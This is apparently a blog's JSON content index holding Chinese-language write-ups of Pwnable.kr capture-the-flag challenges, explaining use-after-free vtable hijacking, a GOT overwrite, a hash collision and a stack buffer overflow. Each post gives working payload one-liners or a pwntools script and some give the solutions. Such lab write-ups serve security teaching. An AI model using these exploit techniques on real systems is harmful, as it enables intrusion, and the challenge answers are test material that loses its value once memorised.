{"meta":{"title":"Mr.red","subtitle":"","description":"Things always start to get better after you give up","author":"Xiao Hong","url":"https://github.com/xiaohong404/xiaohong404.github.io","root":"/xiaohong404.github.io/"},"pages":[{"title":"Categories","date":"2020-10-15T08:23:06.000Z","updated":"2020-10-15T08:41:40.000Z","comments":true,"path":"Categories/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-10-15T04:55:40.000Z","updated":"2020-10-15T10:16:30.000Z","comments":true,"path":"about/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/about/index.html","excerpt":"","text":"小红童鞋，请多指教！"},{"title":"tags","date":"2020-10-15T04:55:36.000Z","updated":"2020-10-15T10:17:12.000Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/index.html","excerpt":"","text":"Pwnable.kr"}],"posts":[{"title":"uaf","slug":"uaf","date":"2020-10-16T02:26:47.000Z","updated":"2020-10-16T07:43:32.000Z","comments":true,"path":"2020/10/16/uaf/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/uaf/","excerpt":"","text":"查看uaf.cpp文件源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system(&quot;/bin/sh&quot;); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; 程序定义一个名为human的虚基类，之后定义了Man和Woman两个类继承这个类，并各自重写了父类的introduce()方法，主函数中，分别创建了一个Man和Woman的对象, 用户可以输入三个选项，分别为： use：Man和Woman分别调用introduce()方法，即使用指针指向的函数 after：分配一段地址空间存储main函数传递的数据，我们可以用其将已经被free的内存，重新allocate free：delete释放掉创建的对象的空间，即将指针指向的内存释放 三者的组合即可构成UAF漏洞 背景知识前置知识1：虚函数的内存地址空间在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。 1234567891011121314151617181920212223242526272829303132class Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; &#125; virtual void g() &#123; cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; &#125; virtual void h() &#123; cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; &#125; int base; protected: private: &#125;; //子类1，无虚函数重载 class Child1 : public Base &#123; public: virtual void f1() &#123; cout &lt;&lt; &quot;Child1::f1&quot; &lt;&lt; endl; &#125; virtual void g1() &#123; cout &lt;&lt; &quot;Child1::g1&quot; &lt;&lt; endl; &#125; virtual void h1() &#123; cout &lt;&lt; &quot;Child1::h1&quot; &lt;&lt; endl; &#125; int child1; protected: private: &#125;; //子类2，有1个虚函数重载 class Child2 : public Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Child2::f&quot; &lt;&lt; endl; &#125; virtual void g2() &#123; cout &lt;&lt; &quot;Child2::g2&quot; &lt;&lt; endl; &#125; virtual void h2() &#123; cout &lt;&lt; &quot;Child2::h2&quot; &lt;&lt; endl; &#125; int child2; protected: private: &#125;; 单一继承，无虚函数重载 单一继承，重载了虚函数 多重继承 总结 如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。注意这并不是直接继承了私有(private)虚函数 当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。 vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr Use-After-FreeDangling pointer Dangling pointer即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为NULL。 UAF原理对Dangling pointer所指向内存进行use，如指针解引用等。 利用思路将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串） 举个栗子123456typedef struct&#123; int id; char *name; int (*func)() //函数指针，可以理解为类里面的方法&#125;; 假设有上述这样的一个结构体指针p，在释放掉p之后，没有将p置NULL，所以p变成Dangling pointer，再通过重新分配，再次拿到p之前指向的这段地址空间。之后，通过strcpy(p2,”addr”)，或者其他方式，向这段地址空间写入新数据。然后当我们通过其他函数，再次使用p指针，就会造成无法预料的后果，因为此时p指针指向的内存包含的内容已经改变。 数据控制 任意地址读：$puts(p-&gt;name)—————&gt;puts(char*(addr2))$ 任意地址写：$strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)$ 控制流劫持：$p-&gt;func()———————&gt;call\\ addr3$ 解题思路查看文件保护措施 思路分析可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。 基本思路为：将main函数创建的两个对象先free，但指针并没有被销毁，之后我们allocate同样的大小，可以得到原先被释放的内存，这样就得到一个可控的地址空间，并且这个空间中记录了之前vptr指针，这样可通过改写这个虚表指针的值，之后再利用use，即m-&gt;introduce()时，劫持程序执行流，将本来执行的introduce函数变成执行give_shell函数。注意main中输入2分配空间是读取传入的两个参数，第一个决定分配空间的大小，第二个是读入一个文件，将文件中的内容写入到刚刚分配的空间中，因此我们首先要取得之前释放的空间，为保证这一点，需要使得传递的参数和之前释放的空间大小相同，而且这里需要分配两次，因为是两个对象，之后文件中的内容需将之前的虚表指针的值覆盖成我们想要的值，因为每个对象空间中的第一项记录的就是vptr，所以直接向文件中写入改写的虚表指针的值即可(从头开始读入，否则中间还需要填充一些字段)。 寻找vtable的地址 直接在将文件拖入IDA64中查看（当然这里也可以用gdb动态调试，从main函数一步步跟进）。因为vptr指向的是vtable中的第一项，由第一项存放的内容是函数give_shell的地址，找到give_shell的位置可以确定vptr的地址为$0x401570$，第二项，即vptr+8所指向的位置，存放的内容是子类重写的函数introduce的地址，main函数中输入1（use）会调用introduce函数，因此我们需要在调用introduce函数时，讲vptr的指针指向give_shell函数，即将指针向前移动8个字节长度。 10x401570 - 8 = 0x401568 -&gt; \\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00 确定每个对象分配的空间大小 可见原本分配的两个对象的空间为$0x18 = 24Byte$，所以之后分配的空间也同样为24字节。（这里没有必要手动计算类对象所占空间的大小，因为不同机器可能会存在差异，知道存在哪些项即可，不必过于纠结为什么是24字节。） 整理如下 输入3（free）：将分配的man和woman的空间释放（这里先释放man，在释放woman） 输入2（allocate）：先将woman释放的空间重新拿回 输入2（allocate）：再将man释放的空间重新拿回 输入（use）：通过传递的参数已经改写了vptr的值，执行introduce即give_shell，拿到flag 拿到flag1python -c &quot;print &#x27;\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot; &gt; /tmp/exp.txt","categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"}]},{"title":"mmutag","slug":"mmutag","date":"2020-10-16T02:02:28.000Z","updated":"2020-10-16T02:10:42.000Z","comments":true,"path":"2020/10/16/mmutag/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/mmutag/","excerpt":"","text":"检查文件保护措施 程序开启了Canary机制和不可执行栈，因此不能直接通过栈溢出或者在栈上执行shellcode的方式进行攻击。","categories":[],"tags":[{"name":"西湖论剑","slug":"西湖论剑","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"}]},{"title":"random","slug":"random","date":"2020-10-15T11:10:35.000Z","updated":"2020-10-15T11:18:36.000Z","comments":true,"path":"2020/10/15/random/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/random/","excerpt":"","text":"查看random.c源代码 函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。 rand（）函数 由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。 查看随机数$disassemble /r \\ main$查看汇编代码 在cmp处下断点汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \\ $rbp-4$查看内存的值即可。 所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。 获得flag求出$0x6b8b4567\\oplus 0xdeadbeef$的值输入即可","categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"}]},{"title":"collision","slug":"collision","date":"2020-10-15T11:10:23.000Z","updated":"2020-10-15T11:15:32.000Z","comments":true,"path":"2020/10/15/collision/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/collision/","excerpt":"","text":"查看C语言源代码 main(int argc, char* argv[]) 传递三个参数$aa,bb,cc$, 程序运行结果如下: 注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递） 分析col.c 函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。 argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。 check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。 如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。 最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，注意不能设置为0x00，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。 另外，注意数据按照小端序存放： 编写python脚本 12./col $(python -c &quot;print &#x27;\\x01\\x01\\x01\\x01&#x27;*4 + &#x27;\\xe8\\x05\\xd9\\x1d&#x27;&quot;)# 这一inline的python表达式可以将生成的结果作为argv[1]参数 拿到flag","categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"}]},{"title":"flag","slug":"flag","date":"2020-10-15T11:10:06.000Z","updated":"2020-10-15T11:16:14.000Z","comments":true,"path":"2020/10/15/flag/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/flag/","excerpt":"","text":"checksec查看文件属性 windows下使用upx -d命令解压缩 IDA64打开解压缩的文件 将flag的值存放到dest中，直接查看flag即可","categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"}]},{"title":"fd","slug":"fd","date":"2020-10-15T10:59:24.000Z","updated":"2020-10-15T11:03:54.000Z","comments":true,"path":"2020/10/15/fd/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/fd/","excerpt":"","text":"登录远程服务器 ls -la查看文件信息linux文件权限知识 发现fd.c和其对应的可执行文件fd（用户有执行权限） cat fd.c查看c语言代码 有源代码可知，这里需要执行system函数的条件为buf缓冲区内容为LETMEIWN read(fd,buf,32)1234567read(fd, buf, 32)fd == 0时：则表示标准输入；fd == 1时：则表示 标准输出；fd == 2时，则表示标准输出错误。buf 表示读入的缓冲区；32表示读入32字节； 因此我们需要设置fd为0，读取我们输入的LETMEWIN到buf缓冲区中即可获得flag。 注意到 1fd = atoi(argv[1]) - 0x1234 要使得$fd=0$，就是让main函数的第一个参数argv[1]等于$0x1234$ ./fd 4660 注意这里参数需要转为10进制 $0x1234_{16} = 4660_{10}$ 1flag: mommy! I think I know what a file descriptor is!!","categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"}]},{"title":"passcode","slug":"passcode","date":"2020-10-15T07:08:39.000Z","updated":"2020-10-15T11:08:46.000Z","comments":true,"path":"2020/10/15/passcode/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/passcode/","excerpt":"","text":"查看passcode.c源文件 第一反应为使得passcode1为338150、passcode2为13371337，之后调用system函数。 login函数中要求输入两个密码passcode1和passcode2，但scanf函数用法错误，其后并没有加上&amp;符号取其地址，而是直接使用了栈上两个没有初始化的随机值，因此直接输入则会出现segmentation fault。因此考虑在login函数之前执行的welcome函数。 welcome函数要求用户输入姓名的字符串，但是允许输入100字节长度，因此尝试使用其覆盖栈上两个变量的“随机值”。 gdb passcode查看其汇编代码disassemble /r welcome disassemble /r login 发现char数组在$ebp - 0x70$处，而passcode1、passcode2分别在$ebp - 0x10、ebp - 0xc$处，其相差的距离$0x70 - 0x10 = 96 &lt; 100,0x70 - 0xc = 100$，因此并不能直接通过输入姓名字符串覆盖变量passcode2,只可以覆盖passcode1。 转换思路查看文件保护措施 栈上开启了Canary机制，因此栈溢出很难成功，发现没有开启PIE，因此可以通过修改某些函数got表的地址，进行调用system函数。实际上，既然scanf是一个具有写功能的函数，我们完全可以利用scanf来修改此后使用到的某个函数的got表项。例如，程序在scanf(“%d”, passcode1);**后立即使用了fflush函数，所以我们完全可以先找到fflush的got表项地址（程序没有开PIE，无需leak），把passcode1布局为该地址，并在调用到scanf(“%d”, passcode1)时输入程序代码中调用system(“/bin/cat flag”);**处的地址，这样执行fflush函数时就会执行system函数。 注意这里区分got表本身的地址和写入got表项中的地址 fflush函数的地址 fflush地址为$0x0804a004$ system函数的地址 这里注意system函数需要将参数先压栈之后再调用，即真正调用的函数地址为$0x080485e3$，即在printf函数之后执行。 编写python脚本1python -c &quot;print &#x27;A&#x27; * 96 + &#x27;\\x04\\xa0\\x04\\x08&#x27; + &#x27;134514147\\n&#x27;&quot; | ./passcode 因为passcode是输入int型，即输入$0x080485e3 = 134514147$。 获得flag","categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"}]},{"title":"bof","slug":"bof","date":"2020-10-15T06:33:21.000Z","updated":"2020-10-16T02:27:24.000Z","comments":true,"path":"2020/10/15/bof/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/bof/","excerpt":"","text":"查看给出的c语言源代码 显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。 IDA32打开文件 编写python脚本123456from pwn import *io = remote(&#x27;pwnable.kr&#x27;,9000)payload = &#x27;a&#x27;*0x2C + &#x27;junk&#x27; + &#x27;junk&#x27; + p32(0xcafebabe)io.interactive()","categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"}]}],"categories":[],"tags":[{"name":"Pwnable.kr","slug":"Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Pwnable-kr/"},{"name":"西湖论剑","slug":"西湖论剑","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"}]}